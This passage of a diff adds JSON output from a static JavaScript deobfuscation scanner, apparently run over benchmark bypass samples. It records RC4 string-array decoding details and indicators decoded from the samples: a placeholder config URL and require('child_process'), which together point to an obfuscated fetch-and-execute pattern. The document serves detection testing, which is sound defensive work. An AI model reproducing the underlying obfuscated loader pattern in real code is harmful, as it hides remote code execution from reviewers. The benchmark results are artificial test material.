+      "sha256": "17d718510174d6ff0837ed7beb16304e86004935fd1128fbc60ffa568f7f02ea",
+      "artifactMatches": [],
+      "bytes": 1495,
+      "findings": [
+        {
+          "kind": "string-array-obfuscation",
+          "severity": "warning",
+          "line": 5,
+          "column": 1,
+          "detail": "string array _0xarr resolved: 6/6 call sites decoded (rc4, offset 419, rotation 9 by checksum)"
+        },
+        {
+          "kind": "obfuscated-string-indicator",
+          "severity": "note",
+          "line": 10,
+          "column": 19,
+          "detail": "https://example.invalid/demo/config.json (resolved from string array)"
+        },
+        {
+          "kind": "obfuscated-string-indicator",
+          "severity": "note",
+          "line": 11,
+          "column": 20,
+          "detail": "require('child_process') (resolved from string array)"
+        }
+      ],
+      "deobfuscation": [
+        {
+          "line": 5,
+          "column": 1,
+          "array": "_0xarr",
+          "strings": 14,
+          "variant": "rc4",
+          "offset": 419,
+          "rotation": 9,
+          "method": "checksum",
+          "callSites": 6,
+          "decodedSites": 6
+        }
+      ],
+      "limitations": [
+        "Static analysis only: the input is parsed and partially evaluated, never executed",
+        "Constant propagation covers const bindings, never-reassigned let/var bindings, literal object properties, single-return helpers, base64 and buffer decoding; no general data flow or reachability",
+        "String-array recovery covers obfuscator.io-style plain, base64 and RC4 decoders",
+        "Encrypted-loader recognition links an embedded payload, a decipher and a code-compiling sink through bindings; ciphertext read at run time is out of scope",
+        "A finding is a review lead, not a maliciousness verdict"
+      ]
+    },
+    {
+      "path": "benchmark/bypass/s4-dynamic-target.js",
+      "schemaVersion": 2,
+      "parser": "acorn",
+      "sha256": "b0292259651887e92447faac81e6256fd9e321f6c1988e3c2787a96deb0ec444",
+      "artifactMatches": [],
+      "bytes": 1489,
+      "findings": [
+        {
+          "kind": "string-array-obfuscation",
+          "severity": "warning",
+          "line": 5,
+          "column": 1,
+          "detail": "string array _0xarr resolved: 6/6 call sites decoded (rc4, offset 419, rotation 9 by printable-consensus)"
+        },
+        {
+          "kind": "obfuscated-string-indicator",
+          "severity": "note",
+          "line": 9,
+          "column": 19,
+          "detail": "https://example.invalid/demo/config.json (resolved from string array)"
+        },
+        {
+          "kind": "obfuscated-string-indicator",
+          "severity": "note",
+          "line": 10,
+          "column": 20,
+          "detail": "require('child_process') (resolved from string array)"
+        }
+      ],
+      "deobfuscation": [
+        {
+          "line": 5,
+          "column": 1,
+          "array": "_0xarr",
+          "strings": 14,
+          "variant": "rc4",
+          "offset": 419,
+          "rotation": 9,
+          "method": "printable-consensus",
+          "callSites": 6,
+          "decodedSites": 6
+        }
+      ],
+      "limitations": [
+        "Static analysis only: the input is parsed and partially evaluated, never executed",
+        "Constant propagation covers const bindings, never-reassigned let/var bindings, literal object properties, single-return helpers, base64 and buffer decoding; no general data flow or reachability",
+        "String-array recovery covers obfuscator.io-style plain, base64 and RC4 decoders",
+        "Encrypted-loader recognition links an embedded payload, a decipher and a code-compiling sink through bindings; ciphertext read at run time is out of scope",
+        "A finding is a review lead, not a maliciousness verdict"
+      ]
+    }
+  ]
+}
